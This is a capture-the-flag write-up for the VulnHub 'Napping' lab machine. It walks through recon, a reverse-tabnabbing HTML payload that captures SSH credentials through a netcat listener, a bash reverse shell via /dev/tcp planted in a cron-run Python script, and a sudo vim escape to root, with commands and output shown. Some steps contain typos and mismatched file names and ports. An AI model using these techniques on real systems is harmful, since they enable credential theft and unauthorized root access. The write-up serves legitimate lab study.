

!----------------------[ NAPPING VULNHUB MECHINE WRITE UP ]-----------------------!


http://ip

NMAP : 
	nmap -sV -sC -A -O $ip

	PORT   STATE SERVICE VERSION
	22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
	| ssh-hostkey:
	|   3072 24:c4:fc:dc:4b:f4:31:a0:ad:0d:20:61:fd:ca:ab:79 (RSA)
	|   256 6f:31:b3:e7:7b:aa:22:a2:a7:80:ef:6d:d2:87:6c:be (ECDSA)
	|_  256 af:01:85:cf:dd:43:e9:8d:32:50:83:b2:41:ec:1d:3b (ED25519)
	80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
	|_http-title: Login
	| http-cookie-flags:
	|   /:
	|     PHPSESSID:
	|_      httponly flag not set
	|_http-server-header: Apache/2.4.41 (Ubuntu)
	MAC Address: 08:00:27:49:EE:4D (Oracle VirtualBox virtual NIC)
	Device type: general purpose
	Running: Linux 4.X|5.X
	OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
	OS details: Linux 4.15 - 5.6
	Network Distance: 1 hop
	Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

	TRACEROUTE
	HOP RTT     ADDRESS
	1   0.54 ms 192.168.56.101



DIRECTORY BRUTEFORCE :
	dirsearch -u http://$ip -x 404,401,403

	[00:52:38] Starting:
	[00:52:59] 200 -    0B  - /config.php
	[00:53:06] 200 -    1KB - /index.php
	[00:53:07] 200 -    1KB - /index.php/login/
	[00:53:10] 302 -    0B  - /logout.php  ->  index.php
	[00:53:19] 200 -    2KB - /register.php


CREATE A USER IN WEB APPLICATION :

	http://$ip/register.php
	$user = test
	$pass = 123456


LOGIN AND CHECK ALL THE FUNCTION:
	
	user input position - [http://URL]

	CHECK SSRF 
---------------------------------------------------------
EXPLOIT :
	
   [1] CREATE A indez.html FILE -
		<--------indez.html-------->
		<!DOCTYPE html>
		<html>
    		<body>
        		<script>
            		windows.opener.location = 'http://[your ip]:9000/index.html';
        		</script>
    		</body>
		</html>

   [2] OPEN A NETCAT LISTENER -
		
		$ nc -lnvp 9000 

   [3] START A HTTP SERVER ON YOUR COMPUETR WHERE
       indez.html FILE PRESENT -
		
		$ python -m http.server
		  Serving HTTP on :: port 8000 (http://[::]:8000/)

   [4] COPY THE URL AND INPUT IN WEB APP
       INPUT POSITION -

       http://[your ip:8000]/indez.html

       get a CLICK BUTTON LATER SUBMIT
       and click on the button
   
   [5] WAIT FOR 1 OR 2 MINITUES -

   	   in your netcat listener get a http post request
   	   and this contain $user & $pass of SSH login

#############################################################
$ python -m http.server
	Serving HTTP on :: port 8000 (http://[::]:8000/) ...
	::ffff:192.168.56.1 - - [03/Sep/2022 01:23:59] "GET /indez.html HTTP/1.1" 200 -
	::ffff:192.168.56.101 - - [03/Sep/2022 01:24:03] "GET /indez.html HTTP/1.1" 200 -

#############################################################
$ nc -lnvp 9000
	Connection from 192.168.56.101:50242
	POST /index.html HTTP/1.1
	Host: 192.168.56.1:9000
	User-Agent: python-requests/2.22.0
	Accept-Encoding: gzip, deflate
	Accept: */*
	Connection: keep-alive
	Content-Length: 45
	Content-Type: application/x-www-form-urlencoded

	username=daniel&password=C%40ughtm3napping123%

#############################################################

SSH LOGIN :
	
	$ ssh daniel@$ip -p 22
	  daniel@$ip's password: C@ughtm3napping123

	[1] CHECK ALL USR
	[2] GO TO adrian USR FOLDER
	[3] CHECK id
	[4] $ find / -group administrators -type f 2>/dev/null
		  
		  /home/adrian/query.py

	[5] cat query.py
		
		from datetime import datetime
		import requests
		import os
		now = datetime.now()

		os.system('/usr/bin/bash /dev/shm/shell.sh')

		r = requests.get('http://127.0.0.1/')
		if r.status_code == 200:
    		f = open("site_status.txt","a")
    		dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    		f.write("Site is Up: ")
    		f.write(dt_string)
    		f.write("\n")
    		f.close()
		else:
    		f = open("site_status.txt","a")
    		dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
    		f.write("Check Out Site: ")
    		f.write(dt_string)
    		f.write("\n")
    		f.close()	  

    [6] GO TO /dev/shm FOLDER & CREATE A RREVERSHELL SCRIPT

    	#!/bin/bash
		bash -c 'bash -i >& /dev/tcp/[your ip]/1234 0>&1'

	[7] AND ALSO ADD SOMTHING IN query.py FILE

		import os
		os.system('/usr/bin/bash /dev/shm/con.sh')

	[8] WAIT 2-3 MIN AND GET REVERSE SHELL


		➜  ~ nc -lnvp 1234
		Connection from 192.168.56.101:53686
		bash: cannot set terminal process group (1797): Inappropriate ioctl for device
		bash: no job control in this shell
		adrian@napping:~$

	[9] $ sudo -l
		sudo -l
		Matching Defaults entries for adrian on napping:
   		env_reset, mail_badpass,
    	secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

		User adrian may run the following commands on napping:
    	(root) NOPASSWD: /usr/bin/vim

    [10] PREVILAGE ESQULATION

    	 sudo /usr/bin/vim -c ':!/bin/sh'

    [11] GET ROOT SHELL


 --------------------------<COMPLETE>-------------------------------